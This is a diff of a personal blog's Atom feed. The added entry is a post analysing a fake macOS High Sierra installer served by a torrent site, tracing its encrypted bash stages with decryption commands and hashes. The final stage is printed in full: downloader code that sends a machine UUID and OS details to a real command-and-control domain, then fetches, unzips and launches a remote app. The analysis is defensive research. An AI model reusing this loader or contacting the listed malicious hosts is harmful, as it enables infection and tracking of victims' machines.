@@ -1,4 +1,186 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.3">Jekyll</generator><link href="https://blog.xfbs.net/feed.xml" rel="self" type="application/atom+xml" /><link href="https://blog.xfbs.net/" rel="alternate" type="text/html" /><updated>2019-06-19T01:35:50+02:00</updated><id>https://blog.xfbs.net/</id><title type="html">xfbs:blog</title><subtitle>Personal blog of xfbs.</subtitle><entry><title type="html">Tweaking ffmpeg</title><link href="https://blog.xfbs.net/posts/tweaking-ffmpeg" rel="alternate" type="text/html" title="Tweaking ffmpeg" /><published>2018-09-23T00:00:00+02:00</published><updated>2018-09-23T00:00:00+02:00</updated><id>https://blog.xfbs.net/posts/tweaking-ffmpeg</id><content type="html" xml:base="https://blog.xfbs.net/posts/tweaking-ffmpeg">&lt;p&gt;Today I spent some time exploring &lt;abbr&gt;ffmpeg&lt;/abbr&gt;. Kind of unintentionally, actually. I actually just wanted to record some screencasts with QuickTime to see what it can do. I didn’t know how easy it was—just open up QuickTime, select New Screen Recording, and off you go. But there is one issue.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.3">Jekyll</generator><link href="https://blog.xfbs.net/feed.xml" rel="self" type="application/atom+xml" /><link href="https://blog.xfbs.net/" rel="alternate" type="text/html" /><updated>2019-06-20T17:17:27+02:00</updated><id>https://blog.xfbs.net/</id><title type="html">xfbs:blog</title><subtitle>Personal blog of xfbs.</subtitle><entry><title type="html">Malware Analaysis on macOS, Part 1: Bash</title><link href="https://blog.xfbs.net/posts/malware-analysis-bash" rel="alternate" type="text/html" title="Malware Analaysis on macOS, Part 1: Bash" /><published>2019-06-17T00:00:00+02:00</published><updated>2019-06-17T00:00:00+02:00</updated><id>https://blog.xfbs.net/posts/malware-analysis-bash</id><content type="html" xml:base="https://blog.xfbs.net/posts/malware-analysis-bash">&lt;p&gt;&lt;em&gt;This is part one of a multi-part series where I reverse engineer some shitty macOS malware. All the code is available &lt;a href=&quot;https://gist.github.com/xfbs/42df932fadaeb0f3888230e6ec1b0a99&quot;&gt;here&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;I didn’t even know there was malware for macOS out there. I mean, I knew it existed, I just didn’t think I’d ever encounter any. These days with all the fancy package managers (homebrew) and App Stores, it’s extremely rare that one has to download software from the scary internet. But today was such a case, at least, in a way.&lt;/p&gt;
+
+&lt;p&gt;I have this old 2010 Mac Mini that I still use for a couple of things. And for some reason, I wanted to wipe it clean and reinstall macOS on it. It doesn’t support the latest version of macOS, 10.14 Mojave, but it does still run 10.13 High Sierra.&lt;/p&gt;
+
+&lt;p&gt;The normal way to do this is to download macOS from the App Store. That way it’s directly from Apple, the download is verified and it’s all good. However, the download from Apple isn’t the fastest, I only got around 1 MB/s from them, which is far less than my connection should max out that.&lt;/p&gt;
+
+&lt;p&gt;So I went into the wild, wild internet and tried to find a torrent for it. That would be a much faster way of downloading High Sierra. So I managed to find a website that offered to download macOS High Sierra 10.13.6, exactly what I was looking for, and so promptly downloaded it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/mac-torrents-malware.png&quot; alt=&quot;Phony website hosting malware&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But of course, you can’t trust the internet. Instead of a &lt;code class=&quot;highlighter-rouge&quot;&gt;.torrent&lt;/code&gt; file, I go a &lt;code class=&quot;highlighter-rouge&quot;&gt;.dmg&lt;/code&gt; that was only around 500 kB. That can’t be right! Normally I would just delete whatever they gave me and go back to Apple’s safe but slightly slower download. But because we are professionals and this is the first time I have encountered macOS malware in the wild, I thought it might be fun to see what I got there, to reverse it a bit.&lt;/p&gt;
+
+&lt;p&gt;The first thing I looked at is the download URL on that website.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cdndownloadjspr.com/dl/?z=6120&amp;amp;name=macOS%20High%20Sierra%2010.13.6%20-17G65-&amp;amp;file=https://mac-torrents.io/wp-content/uploads/2018/07/macOS_10.13.6_High_Sierra.torrent
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, interestingly, you can see that this is on another domain, &lt;code class=&quot;highlighter-rouge&quot;&gt;cdndownloadjspr.com&lt;/code&gt;, which seems to be some sort of a CDN. Embedded in that is a URL going to &lt;code class=&quot;highlighter-rouge&quot;&gt;mac-torrents.io&lt;/code&gt;. If you download that URL, you actually get a valid torrent file:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ wget &quot;https://mac-torrents.io/wp-content/uploads/2018/07/macOS_10.13.6_High_Sierra.torrent&quot;
+$ sha256sum macOS_10.13.6_High_Sierra.torrent
+fa1514a3a009471621db9986abd1e6df44bb9d7383f1be4e0b4ab628ae0f01db  macOS_10.13.6_High_Sierra.torrent
+$ torrentcheck -t *.torrent
+Torrent file  : macOS_10.13.6_High_Sierra.torrent
+Metadata info : 50614 bytes, 2488 pieces, 2097152 bytes per piece
+Torrent name  : macOS_10.13.6_High_Sierra.rar
+Content info  : single file, 5217375346 bytes
+Announce URL  : udp://tracker.leechers-paradise.org:6969
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Those 5217375346 bytes that it reports is about 4.8 GB, which does check out. It might not be authentic, so I wouldn’t trust it, but it does seem more likely to actually be something.&lt;/p&gt;
+
+&lt;p&gt;If you don’t extract that URL, and use the URL of the CDN, then all bets are off. Every time you download it, you get something different. These are all the files I got from downloading the allaged torrent file (I have renamed some of them):&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sha256sum *
+829500e88bd4b19b0f3562eba6a00f0065379b354ac408b79685ca9fe25aa064  macOS High Sierra 10.13.6 -17G65--2.dmg
+8e85ebf5b34fa8285d182602dbad02dfe91cf0f6f68e87e86796a6090c2092d9  macOS High Sierra 10.13.6 -17G65--3.dmg
+9dfc172e9f09a27af6ea9b95d434482502d602c393718f27ffe97d7e26e58eb9  macOS High Sierra 10.13.6 -17G65--4.dmg
+ddcf71302cac7ef9fd80ce754a8c1b138534dfd7bf13a728091014960422a836  macOS High Sierra 10.13.6 -17G65--5.dmg
+2bbf214ee6f289e6e93970cc46562e93fdf7236b5c55c0c1b6e0f2151d57e04f  macOS High Sierra 10.13.6 -17G65-.dmg
+c9e2a57741c4117b59c4cd3a30167a564fde76795df7f4b3682bef283fae54f9  macOS_10.13.6_High_Sierra.dmg
+cc716c1da4be1d03130b59453b5f8f668c07b96cf1a1fde0f0b920c952133428  macOS_10_13_6_High_Sierra.dmg
+faf600fd75c8aafe3dd1a0c12e4970003f771d707e4bfd0226a7fc5da2f21423  macOS_High_Sierra.dmg
+c9e2a57741c4117b59c4cd3a30167a564fde76795df7f4b3682bef283fae54f9  macos_installer_malware.dmg
+8cd90a110eabaa7dd51d912bfb6fc896ed4c002b83e992c7822a71649f3b4911  malware.dmg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I’m not sure if it’s &lt;code class=&quot;highlighter-rouge&quot;&gt;mac-torrents.io&lt;/code&gt; that is malicious, or if it’s the CDN that is malicious. Another clue is that &lt;code class=&quot;highlighter-rouge&quot;&gt;mac-torrents.io&lt;/code&gt; seems to be running WordPress, which is infamous for security holes. So it’s not quite clear who is the bad actor here.&lt;/p&gt;
+
+&lt;p&gt;As for the different checksums on every download, it does seem like they serve different types of malware on every downlod. But it might also be that they slightly randomize each download to evade detection by virus scanners that only check the hashes of files.&lt;/p&gt;
+
+&lt;p&gt;I chose one of these &lt;code class=&quot;highlighter-rouge&quot;&gt;.dmg&lt;/code&gt; files and mounted them. It looks like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/malware-installer.png&quot; alt=&quot;Malware installer&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All of these are perfectly valid DiskImage files. If you don’t know macOS, DiskImage files are like a hybrid between a ZIP file and a virtual CD, in that they are compressed, and you have to “mount” them. They are also read-only and typically used to distribute software.&lt;/p&gt;
+
+&lt;p&gt;All of these &lt;code class=&quot;highlighter-rouge&quot;&gt;.dmg&lt;/code&gt; files are either 500 kB or 1.5 MB in size, which suggests that there are different versions or different payloads here. Some of them don’t have an “Installer” but a “Player” icon that looks like the Adobe Flash Player that is now obsolete but used to be quite important on the internet.&lt;/p&gt;
+
+&lt;p&gt;Since this is a proper macOS app, we can check if the code is signed with Apple’s &lt;code class=&quot;highlighter-rouge&quot;&gt;codesign&lt;/code&gt; utility, and if so, which certificate was used to sign it. MacOS doesn’t like running code that isn’t signed, which is quite good.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ codesign -dvv Installer.app/
+Executable=/Volumes/Installer/Installer.app/Contents/MacOS/lkyuqiwjiavtbfmjckxz
+Identifier=com.lkyuqiwjiavtbfmjckxz
+Format=app bundle with generic
+CodeDirectory v=20200 size=216 flags=0x0(none) hashes=1+3 location=embedded
+Signature size=9014
+Authority=Developer ID Application: Edward Furlhoper (XL8ZVTY2W2)
+Authority=Developer ID Certification Authority
+Authority=Apple Root CA
+Timestamp=10. Jun 2019 at 12:29:18
+Info.plist entries=12
+TeamIdentifier=XL8ZVTY2W2
+Sealed Resources version=2 rules=13 files=2
+Internal requirements count=2 size=236
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As expected, this app is signed. It has the nonsensical identifier &lt;code class=&quot;highlighter-rouge&quot;&gt;com.lkyuqiwjiavtbfmjckxz&lt;/code&gt;, and is signed by an &lt;em&gt;Edward Furlhoper&lt;/em&gt;. A simple search shows that this name is &lt;a href=&quot;https://blog.cyberbyte.org/blog/new-macos-malware-with-command-control-capabilities-disguised-as-cill-tab-adware/&quot;&gt;not unknown&lt;/a&gt;, and this particular individual has been linked to other malware.&lt;/p&gt;
+
+&lt;p&gt;That still doesn’t tell us what this thing actually does. To find that out, we need to actually inspect the code that it is running. So, I just naïvely opened it in &lt;code class=&quot;highlighter-rouge&quot;&gt;vim&lt;/code&gt;, and well, hello there..&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/malware-vim.png&quot; alt=&quot;Malware bash script&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Turns out it’s just a &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt; script. That’s interesting, I guess I would have expected something.. sophisticated. But it does make sense, if you’re going to write malware for a system, you want to do it as cheaply as possible, so you’ll use whatever comes preinstalled. And writing a little bash script works because macOS comes with &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; preinstalled. But what does this thing even do?&lt;/p&gt;
+
+&lt;p&gt;You can see that it finds the parent directory of the directory where it’s stored in (it’s in &lt;code class=&quot;highlighter-rouge&quot;&gt;Installer.app/Contents/MacOS/&lt;/code&gt;, so &lt;code class=&quot;highlighter-rouge&quot;&gt;fileDir&lt;/code&gt; will contain &lt;code class=&quot;highlighter-rouge&quot;&gt;Installer.app/Contents&lt;/code&gt;). It then loads a file, &lt;code class=&quot;highlighter-rouge&quot;&gt;Installer.app/Contents/Resources/enc&lt;/code&gt;, which it decrypts and evaluates. To see what it’s evaluating there, we can just decrypt that file as well and inspect it.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:2822812613 &amp;lt; Installer.app/Contents/Resources/enc &amp;gt; stage_two.sh
+$ sha256sum stage_two.sh
+7b05f80cd95d5aa2c84a47f59e26cf2f5faf8b84661a06f0e8c5cc3094b215ee  /Users/pelsen/malware.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The result of decrypting the file is, unsurprisingly, another bash script.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/malware-decrypted.png&quot; alt=&quot;Malware decrypted script&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This code is obfuscated, but in such a trivial way that we can easily decode it. Very obvious are the two variables, &lt;code class=&quot;highlighter-rouge&quot;&gt;_y&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;_t&lt;/code&gt;. These are a key and some data (interestingly, the same key as the one this file was encrypted with). The functions &lt;code class=&quot;highlighter-rouge&quot;&gt;_m&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;_l&lt;/code&gt; use these variables to decrypt something, a third bash script, which is then evaluated.&lt;/p&gt;
+
+&lt;p&gt;I went through the code to deobfuscate it, sprinkle some comments into it and I was able to learn some things on the way. For example, &lt;code class=&quot;highlighter-rouge&quot;&gt;${#1}&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt; syntax for getting the length of the string variable &lt;code class=&quot;highlighter-rouge&quot;&gt;$1&lt;/code&gt;. The deobfuscated version is available &lt;a href=&quot;https://gist.github.com/xfbs/42df932fadaeb0f3888230e6ec1b0a99#file-macos_malware_deobfuscated-sh&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/malware-deobfuscated.png&quot; alt=&quot;Malware deobfuscated&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can see that they implemented some pseudo-encryption using XOR. If you didn’t know, you can parse hex numbers and perform XOR operations on them with a syntax similar to this:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;xa1&lt;span class=&quot;k&quot;&gt;))&lt;/span&gt; ^ &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;0x1a&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This pseudo-encryption is pretty shit, and trivial to deobfuscate. But things like this are also wildly popular because they are so easy to implement. The fact that it’s implemented in bash does make it look a bit wild.&lt;/p&gt;
+
+&lt;p&gt;Now that we know what it does, we could go through it and follow the code to manually do what it does,to decrypt the data. Or, we can just change the &lt;code class=&quot;highlighter-rouge&quot;&gt;eval&lt;/code&gt; into an &lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt; and run the script, and let it decode itself. Note that this is sometimes dangerous, because if you made a mistake, you could inadvertendly infect your system with malware. So, it’s probably best to do this in a container or a throwaway VM. I just set up a docker container, created an unprivileged user in it, downloaded&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ docker run -it ubuntu /bin/bash
+# adduser user
+# su user
+$ sed -i -e 's/eval/echo/g' stage_two.sh
+$ chmod +x stage_two.sh
+$ ./stage_two.sh &amp;gt; stage_three.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, running all that, we get to the next stage, stage three. This one isn’t even obfuscated at all, it’s just a script that seems to download something from the net and execute it. It is available &lt;a href=&quot;https://gist.github.com/xfbs/42df932fadaeb0f3888230e6ec1b0a99#file-macos_malware_payload-sh&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/macos-malware-payload.png&quot; alt=&quot;MacOS malware payload&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This looks like it’s getting somewhere fun. Interestingly, the password is still the same, they used &lt;code class=&quot;highlighter-rouge&quot;&gt;2822812613&lt;/code&gt; as the password at every stage. We can go through these variables they are setting, to find out what kind of information is passed on to their server, and download whatever their server gives us.&lt;/p&gt;
+
+&lt;p&gt;The first couple variables are just some parameters. The encryption password, which might be used to identify this particular version of the malware, or it might even be generated randomly and be able to track an individual machine.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ENC_PASS=&quot;2822812613&quot;
+APP_DOMAIN=&quot;www.evyet.pw&quot;
+APP_ROUTE=&quot;download/dlst&quot;
+unzip_password=&quot;316218228228228126133456789&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next are some data about the OS that it saves into the variables &lt;code class=&quot;highlighter-rouge&quot;&gt;os_version&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;session_guid&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;machine_id&lt;/code&gt;. That includes the version of macOS you are using, a randomly generated ID and some type of ID to identify the machine. I don’t know if the &lt;code class=&quot;highlighter-rouge&quot;&gt;machine_id&lt;/code&gt; identifies the &lt;em&gt;model&lt;/em&gt; or the particular machine you’re on. I have executed these commands locally to show you what the output looks like. I did censor my &lt;code class=&quot;highlighter-rouge&quot;&gt;machine_id&lt;/code&gt; because I’m not sure if it can be used to track my specific hardware, but the output looks exactly like a UUID.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sw_vers -productVersion
+10.14.5
+$ uuidgen
+769F2AAE-47D3-4EF4-BB6E-64B6742F3662
+$ ioreg -rd1 ioreg -rd1 -c IOPlatformExpertDevice | grep -o '&quot;IOPlatformUUID&quot; = &quot;\(.*\)&quot;'
+XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next comes the interesting part. Here we actually download and execute whatever the server gives us.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;APP_DOMAIN&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;APP_ROUTE&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;?mid=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;machine_id&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;s=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session_guid&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;o=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;os_version&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;p=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ENC_PASS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;tmp_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt; /tmp/XXXXXXXXX&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+curl &lt;span class=&quot;nt&quot;&gt;-f0L&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null 2&amp;gt;&amp;amp;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tmp_path&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;app_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; /tmp/XXXXXXXX&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&quot;&lt;/span&gt; 
+unzip &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;unzip_password&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tmp_path&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;app_dir&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null 2&amp;gt;&amp;amp;1 
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tmp_path&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;file_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;*.app&quot;&lt;/span&gt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;app_dir&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)&quot;&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;volume_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PWD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s@^(/Volumes/[^/]+)/.*@\1@p'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;volume_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;volume_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;// /%20&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;app_dir&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;file_name&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/Contents/MacOS&quot;&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 
+open &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;app_dir&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;file_name&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--args&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session_guid&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;volume_name&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
